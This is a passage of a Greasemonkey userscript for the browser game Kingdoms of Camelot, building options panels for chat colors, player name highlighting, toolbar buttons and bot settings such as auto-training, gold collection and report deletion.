	t.changeColor ('toglowFoodBG', 'lowFoodBG');	t.changeColor ('togWhisperBG', 'WhisperBG');	t.changeColor ('togTournament', 'Tourn');	t.changeColor ('togChatLeaders', 'ChatLeader');	t.changeColor ('togChatMainTiltle', 'MainTitle');	t.changeColor ('togChatMainTiltleSch', 'MainTitleSch');	t.changeColor ('togOptShadow', 'OptShadow');	t.changeColor ('togOptShadowCol', 'OptShadowCol');	t.changeColor ('togDarkRow', 'DarkRow');	t.changeColor ('togButClick', 'ButtonSelected');	t.changeColor ('togOverDarkRow', 'OverviewDarkRow'); t.changeColor ('toggChatAngriff', 'ChatAngriff');	t.changeColor ('togWildAttack', 'WildAttack');	t.changeColor ('togTabHinPop', 'TabHinPop');	t.changeColor ('togMainPop', 'MainPop');	t.changeColor ('togTabTrans', 'TabTrans');	t.changeColor ('togStatsU', 'StatsU');	t.changeColor ('togscToolbarBG', 'scToolbarBG');	t.changeColor ('togscToolbarBG2', 'scToolbarBG2'); t.changeColor ('togstyleRows', 'styleRows');

	document.getElementById('togResetColors').addEventListener ('click', function(){
	var serverID = getServerId();
		RemoveList = (GM_listValues());
		for (i=0;i<RemoveList.length;i++){
			if (RemoveList[i] == "Colors_"+serverID) GM_deleteValue(RemoveList[i]);
		}
		ResetColors=true;
		reloadKOC();
	},false);
	
    } catch (e) {   }
  },
// OPTIONS SUBTAB { PLAYERS }
showPlayers : function (){
    var t = Tabs.Options;
    try { 1
	m = '<DIV style=" max-height:600px;"><div class=pdxStat>'+culang.HnickOpt+'</div>\
		<table width="667" border="0" cellspacing="0" cellpadding="0"><TR><TD width="182"><b><u>1.'+culang.playersound+'</u></b></td><TD width="106" ><b><u>'+culang.vol+'</u></b></td><TD width="271" ><u><b>'+culang.playersoundurl+'</b></u></td><TD width="108">&nbsp;</td></tr>		<TR><TD><INPUT type=checkbox id=togPlayerSound1 /><INPUT type=text id=toguserNameSou1 value="'+ Options.userNameSou1 +'"></td><TD><INPUT type=textbox id=togURLsonUsr1vol value="'+ Options.URLsonUsr1vol +'" size=3 /></td><TD><INPUT type=textbox id=togURLsonUsr1 value="'+ Options.URLsonUsr1 +'" size=45 /></td><TD><input type=button id="PDXDefURLUsr1" value="'+culang.reset+'"></td></tr>		<TR><TD><INPUT type=checkbox id=togNickColor /> '+culang.colors1+'</td><TD ><INPUT style="background:'+Colors.userBGUsrSou1+'" type=text id=toguserBGUsrSou1 value="'+Colors.userBGUsrSou1+'" size=7 maxlength=7></td><TD>&nbsp;</td><TD>&nbsp;</td></tr>\
		</table><div class=pdxStat>'+culang.HplayerOpt+'</div>\
		<table width="100%" border="0" cellspacing="0" cellpadding="0"><TR><TD colspan="2" ><b><u>'+culang.player+' '+culang.colors+'</u></b> </td><TD width="153" ><b><u>'+culang.name+'</u></b></td><TD colspan="2" ><b><u>'+culang.player+' '+culang.colors+'</u></b> </td><TD width="144" ><u><b>'+culang.name+'</b></u></td></tr>		<TR><TD width="200" ><INPUT  type=checkbox id=ptEnableUserName1 />  '+culang.player+' #1 </td><TD  width="44" ><INPUT  style="background:'+Colors.userBG1+'" type=text id=toguserBG1 value="'+Colors.userBG1+'" size=7 maxlength=7></td><TD><input type=text id=togcolorUserName1 value="'+ Options.userName1 +'"></td><TD width="200" ><INPUT  type=checkbox id=ptEnableUserName16 /> '+culang.player+' #16 </td><TD  width="44" ><INPUT  style="background:'+Colors.userBG16+'" type=text id=toguserBG16 value="'+Colors.userBG16+'" size=7 maxlength=7></td><TD><input type=text id=togcolorUserName16 value="'+ Options.userName16 +'"></td></tr>		<TR><TD ><INPUT  type=checkbox id=ptEnableUserName2 /> '+culang.player+' #2 </td><TD  ><INPUT style="background:'+Colors.userBG2+'" type=text id=toguserBG2 value="'+Colors.userBG2+'" size=7 maxlength=7></td><TD ><INPUT  type=text id=togcolorUserName2 value="'+ Options.userName2 +'"></td><TD ><INPUT  type=checkbox id=ptEnableUserName17 />'+culang.player+' #17 </td><TD ><INPUT  style="background:'+Colors.userBG17+'"  type=text id=toguserBG17 value="'+Colors.userBG17+'" size=7 maxlength=7></td><TD ><INPUT  type=text id=togcolorUserName17 value="'+ Options.userName17 +'"></td></tr>		<TR ><TD ><INPUT type=checkbox id=ptEnableUserName3 /> '+culang.player+' #3</td><TD ><INPUT style="background:'+Colors.userBG3+'" type=text id=toguserBG3 value="'+Colors.userBG3+'" size=7 maxlength=7></td><TD><INPUT type=text id=togcolorUserName3 value="'+ Options.userName3 +'"></td><TD ><INPUT type=checkbox id=ptEnableUserName18 /> '+culang.player+' #18 </td><TD ><INPUT style="background:'+Colors.userBG18+'" type=text id=toguserBG18 value="'+Colors.userBG18+'" size=7 maxlength=7></td><TD><INPUT type=text id=togcolorUserName18 value="'+ Options.userName18 +'"></td></tr>		<TR ><TD ><INPUT type=checkbox id=ptEnableUserName4 /> '+culang.player+' #4 </td><TD  ><INPUT style="background:'+Colors.userBG4+'" type=text id=toguserBG4 value="'+Colors.userBG4+'" size=7 maxlength=7></td><TD ><INPUT type=text id=togcolorUserName4 value="'+ Options.userName4 +'"></td><TD ><INPUT type=checkbox id=ptEnableUserName19 />'+culang.player+' #19 </td><TD><INPUT  style="background:'+Colors.userBG19+'"  type=text id=toguserBG19 value="'+Colors.userBG19+'" size=7 maxlength=7></td><TD ><INPUT type=text id=togcolorUserName19 value="'+ Options.userName19+'"></td></tr>		<TR ><TD><INPUT type=checkbox id=ptEnableUserName5 /> '+culang.player+' #5 </td><TD ><INPUT style="background:'+Colors.userBG5+'" type=text id=toguserBG5 value="'+Colors.userBG5+'" size=7 maxlength=7></td><TD><INPUT type=text id=togcolorUserName5 value="'+ Options.userName5 +'"></td><TD><INPUT type=checkbox id=ptEnableUserName20 />'+culang.player+' #20 </td><TD ><INPUT style="background:'+Colors.userBG20+'" type=text id=toguserBG20 value="'+Colors.userBG20+'" size=7 maxlength=7></td><TD><INPUT type=text id=togcolorUserName20 value="'+ Options.userName20 +'"></td></tr>		<TR ><TD ><INPUT type=checkbox id=ptEnableUserName6 /> '+culang.player+' #6 </td><TD ><INPUT style="background:'+Colors.userBG6+'" type=text id=toguserBG6 value="'+Colors.userBG6+'" size=7 maxlength=7></td><TD ><INPUT type=text id=togcolorUserName6 value="'+ Options.userName6 +'"></td><TD ><INPUT type=checkbox id=ptEnableUserName21 /> '+culang.player+' #21 </td><TD ><INPUT style="background:'+Colors.userBG21+'" type=text id=toguserBG21 value="'+Colors.userBG21+'" size=7 maxlength=7></td><TD ><INPUT type=text id=togcolorUserName21 value="'+ Options.userName21 +'"></td></tr>		<TR ><TD><INPUT  type=checkbox id=ptEnableUserName7 /> '+culang.player+' #7 </td><TD ><INPUT style="background:'+Colors.userBG7+'" type=text id=toguserBG7 value="'+Colors.userBG7+'" size=7 maxlength=7></td><TD><INPUT type=text id=togcolorUserName7 value="'+ Options.userName7 +'"></td><TD><INPUT  type=checkbox id=ptEnableUserName22 /> '+culang.player+' #22</td><TD ><INPUT style="background:'+Colors.userBG22+'" type=text id=toguserBG22 value="'+Colors.userBG22+'" size=7 maxlength=7></td><TD><INPUT type=text id=togcolorUserName22 value="'+ Options.userName22 +'"></td></tr>		<TR ><TD ><INPUT type=checkbox id=ptEnableUserName8 /> '+culang.player+' #8 </td><TD ><INPUT style="background:'+Colors.userBG8+'" type=text id=toguserBG8 value="'+Colors.userBG8+'" size=7 maxlength=7></td><TD ><INPUT type=text id=togcolorUserName8 value="'+ Options.userName8 +'"></td><TD ><INPUT type=checkbox id=ptEnableUserName23 />     '+culang.player+' #23 </td><TD ><INPUT style="background:'+Colors.userBG23+'" type=text id=toguserBG23 value="'+Colors.userBG23+'" size=7 maxlength=7></td><TD ><INPUT type=text id=togcolorUserName23 value="'+ Options.userName23 +'"></td></tr>		<TR ><TD ><INPUT type=checkbox id=ptEnableUserName9 /> '+culang.player+' #9 </td><TD ><INPUT style="background:'+Colors.userBG9+'" type=text id=toguserBG9 value="'+Colors.userBG9+'" size=7 maxlength=7></td><TD ><input type=text id=togcolorUserName9 value="'+ Options.userName9 +'"></td><TD ><INPUT type=checkbox id=ptEnableUserName24 />     '+culang.player+' #24 </td><TD ><INPUT style="background:'+Colors.userBG24+'" type=text id=toguserBG24 value="'+Colors.userBG24+'" size=7 maxlength=7></td><TD ><input type=text id=togcolorUserName24 value="'+ Options.userName24 +'"></td></tr>		<TR ><TD><INPUT type=checkbox id=ptEnableUserName10 /> '+culang.player+' #10 </td><TD ><INPUT style="background:'+Colors.userBG10+'" type=text id=toguserBG10 value="'+Colors.userBG10+'" size=7 maxlength=7></td><TD ><INPUT type=text id=togcolorUserName10 value="'+ Options.userName10 +'"></td><TD><INPUT type=checkbox id=ptEnableUserName25 /> '+culang.player+' #25 </td><TD ><INPUT style="background:'+Colors.userBG25+'" type=text id=toguserBG25 value="'+Colors.userBG25+'" size=7 maxlength=7></td><TD ><INPUT type=text id=togcolorUserName25 value="'+ Options.userName25 +'"></td></tr>		<TR ><TD width="180" ><INPUT  type=checkbox id=ptEnableUserName11 /> '+culang.player+' #11 </td><TD  width="44" ><INPUT style="background:'+Colors.userBG11+'" type=text id=toguserBG11 value="'+Colors.userBG11+'" size=7 maxlength=7></td><TD><input type=text id=togcolorUserName11 value="'+ Options.userName11 +'"></td><TD><INPUT type=checkbox id=ptEnableUserName26 /> '+culang.player+' #26 </td><TD ><INPUT style="background:'+Colors.userBG26+'" type=text id=toguserBG26 value="'+Colors.userBG26+'" size=7 maxlength=7></td><TD ><INPUT type=text id=togcolorUserName26 value="'+ Options.userName26 +'"></td></tr>		<TR ><TD ><INPUT  type=checkbox id=ptEnableUserName12 />'+culang.player+' #12 </td><TD  ><INPUT style="background:'+Colors.userBG12+'" type=text id=toguserBG12 value="'+Colors.userBG12+'" size=7 maxlength=7></td><TD ><INPUT  type=text id=togcolorUserName12 value="'+ Options.userName12 +'"></td><TD><INPUT type=checkbox id=ptEnableUserName27 /> '+culang.player+' #27 </td><TD ><INPUT style="background:'+Colors.userBG27+'" type=text id=toguserBG27 value="'+Colors.userBG27+'" size=7 maxlength=7></td><TD ><INPUT type=text id=togcolorUserName27 value="'+ Options.userName27 +'"></td></tr>		<TR ><TD ><INPUT type=checkbox id=ptEnableUserName13 />'+culang.player+' #13 </td><TD ><INPUT style="background:'+Colors.userBG13+'" type=text id=toguserBG13 value="'+Colors.userBG13+'" size=7 maxlength=7></td><TD><INPUT type=text id=togcolorUserName13 value="'+ Options.userName13 +'"></td><TD><INPUT type=checkbox id=ptEnableUserName28 /> '+culang.player+' #28 </td><TD ><INPUT  style="background:'+Colors.userBG28+'" type=text id=toguserBG28 value="'+Colors.userBG28+'" size=7 maxlength=7></td><TD ><INPUT type=text id=togcolorUserName28 value="'+ Options.userName28 +'"></td></tr>		<TR ><TD ><INPUT type=checkbox id=ptEnableUserName14 /> '+culang.player+' #14 </td><TD ><INPUT style="background:'+Colors.userBG14+'" type=text id=toguserBG14 value="'+Colors.userBG14+'" size=7 maxlength=7></td><TD ><INPUT type=text id=togcolorUserName14 value="'+ Options.userName14 +'"></td><TD><INPUT type=checkbox id=ptEnableUserName29 /> '+culang.player+' #29 </td><TD><INPUT  style="background:'+Colors.userBG29+'" type=text id=toguserBG29 value="'+Colors.userBG29+'" size=7 maxlength=7></td><TD ><INPUT type=text id=togcolorUserName29 value="'+ Options.userName29 +'"></td></tr>		<TR ><TD><INPUT type=checkbox id=ptEnableUserName15 />     '+culang.player+' #15  </td><TD ><INPUT style="background:'+Colors.userBG15+'" type=text id=toguserBG15 value="'+Colors.userBG15+'" size=7 maxlength=7></td><TD><INPUT type=text id=togcolorUserName15 value="'+ Options.userName15 +'"></td><TD><INPUT type=checkbox id=ptEnableUserName30 /> '+culang.player+' #30 </td><TD ><INPUT style="background:'+Colors.userBG30+'" type=text id=toguserBG30 value="'+Colors.userBG30+'" size=7 maxlength=7></td><TD ><INPUT type=text id=togcolorUserName30 value="'+ Options.userName30 +'"></td></tr>\
		</table></div>';

	t.optionsDiv.innerHTML = m;
	t.changePlayerCol ('toguserBG1', 'userBG1'); t.changePlayerCol ('toguserBG2', 'userBG2'); t.changePlayerCol ('toguserBG3', 'userBG3'); t.changePlayerCol ('toguserBG4', 'userBG4'); t.changePlayerCol ('toguserBG5', 'userBG5'); t.changePlayerCol ('toguserBG6', 'userBG6'); t.changePlayerCol ('toguserBG7', 'userBG7'); t.changePlayerCol ('toguserBG8', 'userBG8'); t.changePlayerCol ('toguserBG9', 'userBG9'); t.changePlayerCol ('toguserBG10', 'userBG10'); t.changePlayerCol ('toguserBG11', 'userBG11'); t.changePlayerCol ('toguserBG12', 'userBG12'); t.changePlayerCol ('toguserBG13', 'userBG13'); t.changePlayerCol ('toguserBG14', 'userBG14'); t.changePlayerCol ('toguserBG15', 'userBG15'); t.changePlayerCol ('toguserBG16', 'userBG16'); t.changePlayerCol ('toguserBG17', 'userBG17'); t.changePlayerCol ('toguserBG18', 'userBG18'); t.changePlayerCol ('toguserBG19', 'userBG19'); t.changePlayerCol ('toguserBG20', 'userBG20'); t.changePlayerCol ('toguserBG21', 'userBG21'); t.changePlayerCol ('toguserBG22', 'userBG22'); t.changePlayerCol ('toguserBG23', 'userBG23'); t.changePlayerCol ('toguserBG24', 'userBG24'); t.changePlayerCol ('toguserBG25', 'userBG25'); t.changePlayerCol ('toguserBG26', 'userBG26'); t.changePlayerCol ('toguserBG27', 'userBG27'); t.changePlayerCol ('toguserBG28', 'userBG28'); t.changePlayerCol ('toguserBG29', 'userBG29');	t.changePlayerCol ('toguserBG30', 'userBG30');	
	t.changeOpt ('togcolorUserName1', 'userName1'); t.changeOpt ('togcolorUserName2', 'userName2'); t.changeOpt ('togcolorUserName3', 'userName3'); t.changeOpt ('togcolorUserName4', 'userName4'); t.changeOpt ('togcolorUserName5', 'userName5'); t.changeOpt ('togcolorUserName6', 'userName6'); t.changeOpt ('togcolorUserName7', 'userName7'); t.changeOpt ('togcolorUserName8', 'userName8'); t.changeOpt ('togcolorUserName9', 'userName9'); t.changeOpt ('togcolorUserName10', 'userName10'); t.changeOpt ('togcolorUserName11', 'userName11'); t.changeOpt ('togcolorUserName12', 'userName12'); t.changeOpt ('togcolorUserName13', 'userName13'); t.changeOpt ('togcolorUserName14', 'userName14'); t.changeOpt ('togcolorUserName15', 'userName15'); t.changeOpt ('togcolorUserName16', 'userName16'); t.changeOpt ('togcolorUserName17', 'userName17'); t.changeOpt ('togcolorUserName18', 'userName18'); t.changeOpt ('togcolorUserName19', 'userName19'); t.changeOpt ('togcolorUserName20', 'userName20'); t.changeOpt ('togcolorUserName21', 'userName21'); t.changeOpt ('togcolorUserName22', 'userName22'); t.changeOpt ('togcolorUserName23', 'userName23'); t.changeOpt ('togcolorUserName24', 'userName24'); t.changeOpt ('togcolorUserName25', 'userName25'); t.changeOpt ('togcolorUserName26', 'userName26'); t.changeOpt ('togcolorUserName27', 'userName27'); t.changeOpt ('togcolorUserName28', 'userName28'); t.changeOpt ('togcolorUserName29', 'userName29');	t.changeOpt ('togcolorUserName30', 'userName30');
	t.togOpt ('ptEnableUserName1', 'enableUserName1'); t.togOpt ('ptEnableUserName2', 'enableUserName2'); t.togOpt ('ptEnableUserName3', 'enableUserName3'); t.togOpt ('ptEnableUserName4', 'enableUserName4'); t.togOpt ('ptEnableUserName5', 'enableUserName5'); t.togOpt ('ptEnableUserName6', 'enableUserName6'); t.togOpt ('ptEnableUserName7', 'enableUserName7'); t.togOpt ('ptEnableUserName8', 'enableUserName8'); t.togOpt ('ptEnableUserName9', 'enableUserName9'); t.togOpt ('ptEnableUserName10', 'enableUserName10');	t.togOpt ('ptEnableUserName11', 'enableUserName11'); t.togOpt ('ptEnableUserName12', 'enableUserName12'); t.togOpt ('ptEnableUserName13', 'enableUserName13'); t.togOpt ('ptEnableUserName14', 'enableUserName14'); t.togOpt ('ptEnableUserName15', 'enableUserName15'); t.togOpt ('ptEnableUserName16', 'enableUserName16'); t.togOpt ('ptEnableUserName17', 'enableUserName17'); t.togOpt ('ptEnableUserName18', 'enableUserName18'); t.togOpt ('ptEnableUserName19', 'enableUserName19'); t.togOpt ('ptEnableUserName20', 'enableUserName20'); t.togOpt ('ptEnableUserName21', 'enableUserName21'); t.togOpt ('ptEnableUserName22', 'enableUserName22'); t.togOpt ('ptEnableUserName23', 'enableUserName23'); t.togOpt ('ptEnableUserName24', 'enableUserName24'); t.togOpt ('ptEnableUserName25', 'enableUserName25'); t.togOpt ('ptEnableUserName26', 'enableUserName26'); t.togOpt ('ptEnableUserName27', 'enableUserName27'); t.togOpt ('ptEnableUserName28', 'enableUserName28'); t.togOpt ('ptEnableUserName29', 'enableUserName29'); t.togOpt ('ptEnableUserName30', 'enableUserName30');
	t.changeOpt ('toguserNameSou1', 'userNameSou1'); t.changeOpt ('togURLsonUsr1', 'URLsonUsr1'); t.changeOpt ('togURLsonUsr1vol', 'URLsonUsr1vol');	t.changePlayerCol ('toguserBGUsrSou1', 'userBGUsrSou1');
	t.togOpt ('togNickColor', 'enableNickColor'); t.togOpt ('togPlayerSound1', 'enableUsr1Sound');

	document.getElementById("PDXDefURLUsr1").addEventListener ('click', function () {
		Options.URLsonUsr1 = ''+mainSoundSource+'fluestersound.mp3';
		document.getElementById('togURLsonUsr1').value=''+mainSoundSource+'fluestersound.mp3';
		saveOptions();
	}, false);
	
    } catch (e) {    }
	},
// OPTIONS SUBTAB { STYLE }
   showStyle : function (){
    var t = Tabs.Options;
    try {
      m = '<DIV style=" max-height:500px;"><div class=pdxStat>'+culang.HkpwerSS+'</div><table class=pdxTab>\
		<tr><td  colspan="2"><b><u>1. '+culang.OButtons +'</u></b></td><td colspan="2"><b><u>2. '+culang.auto+' '+culang.OButtons+'</u></b></td><td colspan="2"><u><b>4. '+culang.OChatstyle +'</b></u></td></tr>\
		<tr><td width="20"><INPUT id=togNeueNachricht type=checkbox /></td><td width="206">'+culang.composemessages+'</td><td><INPUT id=togATransport type=checkbox /></td><td>'+culang.atransport+'</td><td width="20"><INPUT id=togChatStuff type=checkbox /></td><td width="343">'+culang.OtogChatStuff +' <SPAN class=boldRed>('+culang.OChatStuffNote+')</span></td></tr>\
		<tr><td><INPUT id=togMeineBerichte type=checkbox /></td><td>'+culang.viewmessages+'</td><td><INPUT id=togANeuzuordnen type=checkbox /></td><td>'+culang.autoreassign+'</td><td colspan="2"><b><u>5. '+culang.OscSettings+'</u></b> <span class=boldRed>(need fix)</span> </td></tr>\
		<tr><td height="22"><INPUT id=togAllianzBerichte type=checkbox /></td><td>'+culang.alliancereports+'</td><td><INPUT type=checkbox id=togscCrest /></td><td>'+culang.crest+'</td><td><INPUT id=togHideKoCBar type=checkbox /></td><td>'+culang.hideKoCBar+' </td></tr>\
		<tr><td><INPUT id=togVerstaerken type=checkbox /></td><td>'+culang.reinforce+' </td><td><INPUT type=checkbox id=togscDF /></td><td>'+culang.darkforest+'</td><td><INPUT type=checkbox id=toghideFriends /></td><td>'+culang.knightlist+' </td></tr>\
		<tr><td><INPUT id=togNeuzuordnen type=checkbox /></td><td>'+culang.reassign+'</td><td><INPUT type=checkbox id=togscRaidReset /></td><td>'+culang.raidreset+'</td><td><INPUT id=toghideKoCHeader type=checkbox /></td><td>'+culang.hideKoCHeader+'</td></tr>\
		<tr><td><INPUT type=checkbox id=togTransport /></td><td>'+culang.transport+'</td><td><INPUT id=togAutoRefresh type=checkbox /></td><td>'+culang.arefresh+'</td><td><INPUT id=togKoCBottomStuff type=checkbox /></td><td>'+culang.hideKoCBottom+'</td></tr>\
		<tr><td><INPUT type=checkbox id=togWiederholen /></td><td>'+culang.repeat+'</td><td width="23"><INPUT type=checkbox id=togAutoBau /></td><td width="253">'+culang.autobuild+'</td><td>&nbsp;</td><td>&nbsp;</td></tr>\
		<tr><td colspan="2"><b><u>3. '+culang.shortcutExtras+'</u></b></td><td><INPUT type=checkbox id=togMakieren /></td><td>'+culang.buildmode+'</td><td>&nbsp;</td><td>&nbsp;</td></tr>\
		<tr><td><INPUT type=checkbox id=togLinebreak /></td><td><u>'+culang.linebreak+'</u></td><td><INPUT type=checkbox id=togHilfe /></td><td>'+culang.askhelp+'</td><td></td><td>&nbsp;</td></tr>\
		<tr><td><INPUT type=checkbox id=togSeperator1 /></td><td>'+culang.seperator+' - '+culang.scToolbar+' </td><td><INPUT type=checkbox id=togscAutoTrain /></td><td>'+culang.autotrain+'</td><td>&nbsp;</td><td>&nbsp;</td></tr>\
		<tr><td><INPUT type=checkbox id=togSeperator2 /></td><td>'+culang.seperator+' - '+culang.auto+' </td><td><INPUT type=checkbox id=togscCrafting /></td><td>'+culang.crafting+'</td><td>&nbsp;</td><td>&nbsp;</td></tr>\
		<tr><td>&nbsp;</td><td>&nbsp;</td><td><INPUT type=checkbox id=togStopSound /></td><td>'+culang.stopsound+'</td><td>&nbsp;</td><td>&nbsp;</td></tr>\
		</table><HR><B><u>'+culang.impnote+'</u>:</b> '+culang.Onote +' </div>';
		   
	t.optionsDiv.innerHTML = m;

	t.togOpt ('togHideKoCBar', 'hideKoCBar');	t.togOpt ('toghideKoCHeader', 'hideKoCHeader');	t.togOpt ('togKoCBottomStuff', 'hideShowKoCBottomStuff');	t.togOpt ('toghideFriends', 'hideFriends');
	t.togOpt ('togSeperator1', 'scSeperator1');	t.togOpt ('togSeperator2', 'scSeperator2');	t.togOpt ('togLinebreak', 'scLinebreak');
	t.togOpt ('togChatStuff', 'chatEnhance', ChatStuffE.setEnable, ChatStuffE.isAvailable);

	t.togOpt ('togTransport', 'Transport');	t.togOpt ('togATransport', 'AutoTransport'); 	t.togOpt ('togscCrafting', 'scCrafting');	t.togOpt ('togANeuzuordnen', 'AutoNeuzuordnen');	t.togOpt ('togNeueNachricht', 'NeueNachricht');	t.togOpt ('togMeineBerichte', 'MeineBerichte');	t.togOpt ('togAllianzBerichte', 'AllianzBerichte');	t.togOpt ('togVerstaerken', 'Verstaerken');		t.togOpt ('togNeuzuordnen', 'Neuzuordnen');	t.togOpt ('togWiederholen', 'Wiederholen');	t.togOpt ('togAutoBau', 'AutoBau');	t.togOpt ('togMakieren', 'Makieren');	t.togOpt ('togHilfe', 'Hilfe');	t.togOpt ('togAutoRefresh', 'AutoRefresh');	t.togOpt ('togscRaidReset', 'scRaidReset');	t.togOpt ('togscAutoTrain', 'scAutoTrain');	t.togOpt ('togscCrest', 'scCrest');	t.togOpt ('togscDF', 'DarkForestButton');	t.togOpt ('togStopSound', 'scStopSound');

	// t.togOpt ('pbscToolbar', 'scToolbar'); <INPUT id=pbscToolbar type=checkbox /> '+culang.ksxbuttler+'
    // t.togOpt ('togChatBold', 'chatbold'); <INPUT type=checkbox id=togChatBold />'+culang.OtogChatBold +'

    } catch (e) {    }
  },
// OPTIONS SUBTAB { BOT }
showBot : function (){
     var t = Tabs.Options;

    try {
	m = '<DIV style=" max-height:500px;"><TABLE width=100% class=pdxTab cellspacing=0 cellpadding=0>\
	<TR><TD colspan=2><DIV class=pdxStat>'+culang.HkpwrbotS+'</div></tr>\
	<TR><TD width="10"><INPUT id=ptEnableFoodChatWarn type=checkbox /></td><TD>'+culang.Olowfoodwarn1+' \
	<INPUT id=optfoodChatWarnHours type=text size=3 value="'+ Options.foodChatWarnHours +'"> '+culang.Olowfoodwarn2 +' <font color=#FF0000>('+culang.OlowfoodwarnNote +')</td></tr>\
	<TR><TD><INPUT id=pbFairie type=checkbox /></td><TD>'+culang.OpbFairie  +'</td></tr>\
	<TR><TD><INPUT id=pbWideOpt type=checkbox '+ (GlobalOptions.pbWideScreen?'CHECKED ':'') +'/></td><TD>'+culang.OpbWideOpt +' '+ htmlSelector({normal:''+culang.OwideOptnormal+'', wide:''+culang.OwideOptwide +'', ultra:''+culang.OwideOptultra +'',  mega:''+culang.OwideOptmega +'',own:''+culang.OwideOptown+''},GlobalOptions.pbWideScreenStyle,'id=selectScreenMode') +' <font color=#FF0000>('+culang.needRefresh +')</font> - <b>'+culang.OwideOptown+'</b> '+culang.OwideOownsel+'! </td></tr>\
	<TR><TD><INPUT id=pbWatchEnable type=checkbox '+ (GlobalOptions.pbWatchdog?'CHECKED ':'') +'/></td><TD>'+culang.OpbWatchEnable +' <font color=#FF0000>('+culang.alldomains +')</font></td></tr>\
	<TR><TD><INPUT id=pbGoldEnable type=checkbox /></td><TD>'+culang.OpbGoldEnable +' <INPUT id=pbgoldLimit type=text size=2 maxlength=3 \>'+culang.OpbGoldEnable2 +'</td></tr>\
	<TR><TD><INPUT id=HelReq type=checkbox /></td><TD>'+culang.OHelReq +'</td></tr>\
	<TR><TD><INPUT id=PubReq type=checkbox '+ (GlobalOptions.autoPublishGamePopups?'CHECKED ':'') +'/></td><TD>'+culang.OPubRew +' <font color=#FF0000>('+culang.OPubRewNote +')</font></td>\
	<TR><TD></td><TD>'+culang.OHelprivacy+' '+ htmlSelector({0:'----', 80:''+culang.all+'', 50:''+culang.Ofriendsfriends+'', 40:''+culang.Oonlyfriends+'', 10:''+culang.Oonlyme+''},GlobalOptions.autoPublishPrivacySetting,'id=selectprivacymode') +' </td></tr>\
	<TR><TD><INPUT id=DelReq type=checkbox /></td><TD>'+culang.ODelRew +'</td></tr>\
	<TR><TD colspan=2><DIV class=pdxStat>'+culang.Hreports+'</div></tr>\
	<TR><TD><INPUT id=deletetoggle type=checkbox /></td><TD> '+culang.Odeletetoogle +' <span class=boldRed>('+culang.OdeletetoogleNote +')</span></td></tr>\
	<TR><TD><INPUT id=deletes0toggle type=checkbox /></td><TD> '+culang.Odeletes0toggle+' <span class=boldRed>('+culang.Odeletes0toggleNote +')</span></td></tr>\
	<TR><TD><INPUT id=deletes1toggle type=checkbox /></td><TD> '+culang.deletes1toggle +'</td></tr>\
	<TR><TD><INPUT id=deletes2toggle type=checkbox /></td><TD> '+culang.deletes2toggle + '</td></tr>\
	<TR><TD><INPUT id=deletes3toggle type=checkbox /></td><TD> '+culang.deletes3toggle + ' </td></tr>\
	<TR><TD></td><td>'+culang.OdeleteTimer+': <input type=text size=3 id=deletetimer value="'+ parseInt(Options.DeleteTimer) +'"> '+culang.OdeleteTimer2+'</td></tr>\
	<TR><TD colspan=2><DIV class=pdxStat>'+culang.HSTtrain+' - '+culang.Hsettings+'</div></tr>\
	<TD></td><TD>'+culang.OAutoTrainOptions +' <INPUT id=optAutoTrainMins type=text size=1 value="'+ parseInt(WallTrainOptions.intervalSecs/60) +'"> '+culang.OAutoTrainOptions2+'</td></tr>\
	</table><HR><B><u>'+culang.impnote+'</u>:</b> '+culang.Onote +'\
	</div>';
		   
	t.optionsDiv.innerHTML = m;
	
	if (!parseIntNan(document.getElementById('deletetimer').value) <60) {
	    Options.DeleteTimer = 120;
	    document.getElementById('deletetimer').value = "120";
		saveOptions();
	}
	document.getElementById('deletetimer').addEventListener ('change', function () {
	  if (parseInt(document.getElementById('deletetimer').value) > 59) {
	    Options.DeleteTimer = document.getElementById('deletetimer').value;
	   } else {
	    Options.DeleteTimer = 120;
	    document.getElementById('deletetimer').value = "120";
	   }
	  saveOptions();
	}, false);
	
	  document.getElementById('optfoodChatWarnHours').addEventListener ('change', function () {
          var fcw = document.getElementById('optfoodChatWarnHours').value;
          if (isNaN(fcw) || fcw<0.01 || fcw>99999){
            document.getElementById('optfoodChatWarnHours').value = Options.foodChatWarnHours;
            return;
          }
          Options.foodChatWarnHours = fcw;
          saveOptions();
        }, false);
	  document.getElementById('selectScreenMode').addEventListener ('change', function(){
         GlobalOptions.pbWideScreenStyle = document.getElementById('selectScreenMode').value;
         GM_setValue ('GlobalOptions_??', JSON2.stringify(GlobalOptions));
		 saveGlobalOptions();
      },false);
	  document.getElementById('selectprivacymode').addEventListener ('change', function(){
         GlobalOptions.autoPublishPrivacySetting = document.getElementById('selectprivacymode').value;
         GM_setValue ('GlobalOptions_??', JSON2.stringify(GlobalOptions));
		 saveGlobalOptions();
      },false);
      document.getElementById('PubReq').addEventListener ('change', function(){
         GlobalOptions.autoPublishGamePopups = document.getElementById('PubReq').checked;
         GM_setValue ('GlobalOptions_??', JSON2.stringify(GlobalOptions));
		  saveGlobalOptions();
      },false);

      document.getElementById('pbWatchEnable').addEventListener ('change', t.e_watchChanged, false);
      document.getElementById('pbWideOpt').addEventListener ('change', t.e_wideChanged, false);

	  document.getElementById('optAutoTrainMins').addEventListener ('change', function () {
				WallTrainOptions.intervalSecs = 60 * document.getElementById('optAutoTrainMins').value;
				saveWallTrainOptions();
	  }, false);

	  t.togOpt ('pbFairie', 'pbKillFairie', FairieKiller.setEnable);
      t.togOpt ('pbGoldEnable', 'pbGoldEnable', CollectGold.setEnable);
      t.togOpt ('ptEnableFoodChatWarn', 'enableFoodChatWarn');         //25mar
      t.togOpt ('HelReq', 'HelpRequest');
      t.togOpt ('DelReq', 'DeleteRequest');      t.togOpt ('deletetoggle', 'DeleteMsg');      t.togOpt ('deletes0toggle', 'DeleteMsgs0');      t.togOpt ('deletes1toggle', 'DeleteMsgs1');	  
	  t.togOpt ('deletes2toggle', 'DeleteMsgs2');
	  t.togOpt ('deletes3toggle', 'DeleteMsgs3');
	  t.changeOpt ('pbgoldLimit', 'pbGoldHappy');
      nHtml.SetSelect(document.getElementById('htmlSelector'),this.options.autoPublishPrivacySetting);
	  
    } catch (e) {    }
  },
// OPTIONS SUBTAB { TOOLS }
  showTools : function (){
  div = document.createElement('div');
	var t = Tabs.Options;
	  try {
	  m = '<DIV style=" max-height:500px;"><TABLE width=100% class=pdxTab cellspacing=0 cellpadding=0>\
			<TR><TD  colspan=2><div class=pdxStat>'+culang.Hkpwrtools+'</div></td></tr>\
